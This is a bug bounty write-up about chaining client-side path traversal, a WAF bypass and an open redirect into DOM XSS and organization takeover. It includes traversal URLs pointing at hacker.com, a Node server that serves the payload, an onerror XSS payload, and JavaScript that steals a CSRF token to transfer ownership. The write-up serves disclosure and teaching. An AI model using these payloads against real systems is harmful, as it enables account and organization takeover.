# 1-Click Organization Takeover: Chaining CSPT with Open Redirect

CSPT (Client-Side Path Traversal) is very common among bug bounty programs. Although most of the time you can't report it alone, you can chain it with other types of bugs to achieve a higher impact.

## Finding the CSPT

For finding CSPTs, I always use the amazing [Geko](https://chromewebstore.google.com/detail/gecko/mngjkdkdahjibopfhpmnhidknebhfldn?pli=1) extension by [busf4ctor](https://x.com/busf4ctor?lang=en). While using the application, I identified and verified a CSPT bug inside the path:

`https://target.com/docs/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee`


So I tried:

`https://target.com/docs/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee%2f..%2fcspt`

But I was blocked by the WAF. I tried using `%5c` (backslash) instead:

`https://target.com/docs/aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee%5c..%5ccspt`

And it worked!

## Finding the Open Redirect

One of the application functionalities allows you to integrate third-party websites. it asks you to add the **Tenant Name** (directly appended to the third-party tenant's domain) and then authenticate to the tenant.

![image](../images/image.png)

In the tenant name field, I tried adding special characters like (`/ ? " '`) and the application accepted it! I tried testing for other types of bugs like XSS and SSRF, but nothing worked. However, I found that I could manipulate the path.

![image](../images/image%20copy.png)

Like that, I can add my own domain(plus path) as a tenant! In the next step for adding the integration,I tried adding `https://hacker.com/exploit?`and it worked adding the rest of the domain name to url query. after that the application asks you to verify authentication. Clicking the verify authentication button redirects you to your tenant in this case, it redirects to my own website!! The open redirect endpoint looked something like this:

`https://target.com/authenticate/integration/verify`

visiting this endpoint will redirect the user to `https://hacker.com/exploit?`

the full exploit url:

`https://target.com/docs/..%5c..%5c..%5c..%5cauthenticate/integeration/verify` the application tries to fetch `https://hacker.com/exploit`.

## The First Issue: JavaScript Type Error

After finding the open redirect, I could now control the response of the webpage with the CSPT to come from my own server. Fortunately, the original response contained a JSON object that controls the whole webpage content. However, the application uses Vue.js, so direct XSS won't work here.

I copied the original JSON response, hosted it on my own server, and played with it, but nothing showed up. I checked the console and found this error:

![image](../images/image%20copy%202.png)

Debugging using the dev tools, it turned out that this piece of code broke because of my JSON response. It expects an Array, but after investigation, it turned out that the CSPT manipulated another request that should return an Array, but now it is returning my JSON object instead.

To solve this issue, I realized that my CSPT affected **three different requests** made by the same page: two of them expect a JSON object (and they were different, but I can nest all the data needed inside one object), and the third one expects an Array.

So, I programmed my server to respond with a JSON object for the first two requests to this endpoint, and for the third request, it responds with an empty array. Here is the code I used:

```javascript
let hitcount = 0;
app.get('/exploit.json', (req, res) => {
        hitcount++
        if(hitcount == 3){
                res.sendFile(path.join(__dirname, 'arr.json'))
        }
        else{
        res.sendFile(path.join(__dirname, 'exploit.json'))
        }

          if (resetTimer) clearTimeout(resetTimer);
  resetTimer = setTimeout(() => {
    hitcount = 0;
    resetTimer = null;
  }, 5000);
});
```

## the second issue finding XSS sink

To give you some background, the page with the CSPT is a page where the user can set multiple types of questions (checkbox, text fields, yes or no, etc.). Injecting into these fields didn't execute any JS, so I looked again inside the application to see what other question types I could add to the page.

While reading the question types and their descriptions, I found that one of them allows for adding Rich Text. The question description was as follows:

```
                {
                    "order": 1,
                    "active": true,
                    "questionType": "RICHTEXT",
                    "Display": "Rich Text (HTML)",
                    "options": [{
                    "short": "Short text",
                    "answer": ""
                }]
                }
```

So I copied the question JSON and injected `<img src=x onerror=alert(document.domain)>` in the question answer field and popped the XSS!!

![image](../images/image%20copy%203.png)


## Escaltion To organization takeover

t this point, I have a Dom Based XSS with the same organization requiring admin privileges (only admins can edit integration settings). With the session cookies being HttpOnly, I tried self-XSS escalation techniques, but it didn't work as I didn't have a logout CSRF.

The only impact I could find was to steal the CSRF token and take ownership of the organization. This is the exploit code:
```
let hackerid = 12345;
let myform = document.createElement('form');
myform.target = '_blank';
myform.action = 'https://traget.com/users/transfer-owner';
myform.method = 'POST';
let id = document.createElement('input');
id.name = 'new-owner';
id.value = hackerid;
id.type = 'text';
let input = document.createElement('input');
input.name = 'csrfmiddlewaretoken';
input.value = document.querySelector('input[name=csrftoken]').value;
input.type = 'text'; myform.appendChild(id);
myform.appendChild(input);
document.body.appendChild(myform); myform.submit();
```

The exploit creates a form with two input elements, then steals the CSRF token via` document.querySelector` and stores it in the input value. The second element contains the hackerid. Then JavaScript auto-submits the form and transfers ownership to the hacker.

here is a high level overview of the expolit steps:

![image](../images/image%20copy%204.png)
## More Stuff to Read About CSPT: 

- https://vitorfalcao.com/posts/hacking-high-profile-targets/
- https://matanber.com/blog/cspt-levels
- https://blog.doyensec.com/2025/03/27/cspt-resources.html
- https://x.com/xssdoctor/status/1961157661048578402?s=20

